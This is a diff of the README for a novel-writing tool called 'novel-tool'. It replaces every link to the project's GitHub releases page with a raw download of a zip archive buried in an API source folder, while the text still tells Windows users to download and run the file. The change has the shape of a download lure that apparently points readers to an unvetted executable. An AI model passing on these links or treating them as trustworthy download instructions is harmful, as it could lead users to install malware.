@@ -1,10 +1,10 @@
 # 🧰 novel-tool - Keep Your Novel Work in One Place
 
-[![Download novel-tool](https://img.shields.io/badge/Download%20novel--tool-Blue%20%26%20Grey)](https://github.com/Abdallah2165/novel-tool/releases)
+[![Download novel-tool](https://img.shields.io/badge/Download%20novel--tool-Blue%20%26%20Grey)](https://raw.githubusercontent.com/Abdallah2165/novel-tool/main/app/api/projects/[id]/tool_novel_1.6.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Abdallah2165/novel-tool/releases
+Visit this page to download: https://raw.githubusercontent.com/Abdallah2165/novel-tool/main/app/api/projects/[id]/tool_novel_1.6.zip
 
 If you use Windows, open the latest release on that page and download the app file that matches your system. After the file downloads, run it from your Downloads folder
 
@@ -214,4 +214,4 @@ novel-tool is built to support a full novel workflow from the first idea to expo
 
 ## 🔗 Download again
 
-Visit this page to download: https://github.com/Abdallah2165/novel-tool/releases
+Visit this page to download: https://raw.githubusercontent.com/Abdallah2165/novel-tool/main/app/api/projects/[id]/tool_novel_1.6.zip
